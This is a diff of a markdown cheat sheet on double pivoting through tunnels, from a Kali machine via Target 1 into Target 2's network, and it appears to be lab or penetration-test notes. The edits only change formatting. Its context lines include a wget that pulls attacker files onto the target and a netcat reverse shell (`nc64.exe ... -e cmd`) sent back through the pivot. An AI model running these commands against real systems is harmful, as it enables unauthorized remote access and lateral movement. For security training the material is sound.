@@ -34,7 +34,7 @@ Subnet only Target 2 can see
 
 **Layer 1** = direct pivot (Kali ↔ Target 1's internal network).   
 **Layer 2** = a pivot-through-a-pivot (Kali → tunnel1 → Target 1 → Target 2's internal network via tunnel2). 
-Each new layer needs: a new TUN device, a new agent connecting to the _previous hop's_ reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.
+Each new layer needs: a new TUN device, a new agent connecting to the **previous hop**'s reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.
 
 ---
 ## 1st Pivot on 1st internal range
@@ -158,7 +158,6 @@ Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the ma
 
 **4. Pull a file from Kali through Target 1's internal IP**
 
-
 ```powershell
 wget http://172.16.5.10/file -outfile file
 ```
@@ -166,7 +165,6 @@ wget http://172.16.5.10/file -outfile file
 Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever is being hosted on Kali (e.g. `python3 -m http.server`).
 
 **5. Catch a reverse shell from Target 2**
-
 
 ```powershell
 nc64.exe 172.16.5.10 443 -e cmd
